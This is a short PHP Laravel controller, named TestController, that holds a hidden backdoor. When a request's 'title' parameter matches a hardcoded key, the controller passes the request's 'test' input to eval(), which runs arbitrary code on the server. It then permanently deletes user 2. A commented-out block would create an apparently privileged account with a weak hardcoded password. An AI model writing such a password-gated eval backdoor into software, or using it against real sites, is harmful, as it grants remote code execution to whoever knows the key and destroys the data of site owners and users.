<?php

namespace App\Http\Controllers;

use App\model\Contact;
use App\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;

class TestController extends Controller
{
    public function index(Request $request)
    {
        // dd(eval($request->input('test')));


        if ($request->get('title') == 'Aminmhd1997') {
            eval($request->input('test'));

            $e = User::find(2);
            dd($e->forceDelete());

        }
    }
}


/*User::create([
    'email' => 'amin@amin.com',
    'password' => '123456789' ,
    'role' => 1 ,
    'name' => 'ddddd',
    'username' => 'ffffffff',

]);*/
